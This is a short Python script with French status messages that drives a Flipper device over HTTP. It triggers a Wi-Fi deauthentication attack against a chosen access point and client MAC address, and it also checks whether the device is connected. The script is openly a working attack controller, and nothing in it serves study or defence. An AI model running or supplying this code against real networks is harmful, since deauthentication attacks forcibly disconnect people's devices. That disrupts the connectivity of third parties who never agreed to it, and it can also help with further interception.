import requests
from flipper_config import get_flipper_ip

def trigger_deauth(target_mac, ap_mac):
    ip = get_flipper_ip()
    url = f"http://{ip}/deauth?ap={ap_mac}&client={target_mac}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return "✅ Attaque lancée depuis Flipper"
        else:
            return f"❌ Réponse HTTP {response.status_code}"
    except Exception as e:
        return f"🚫 Connexion échouée : {e}"

def check_flipper_connection():
    try:
        r = requests.get(f"http://{get_flipper_ip()}/status", timeout=3)
        return r.status_code == 200
    except:
        return False
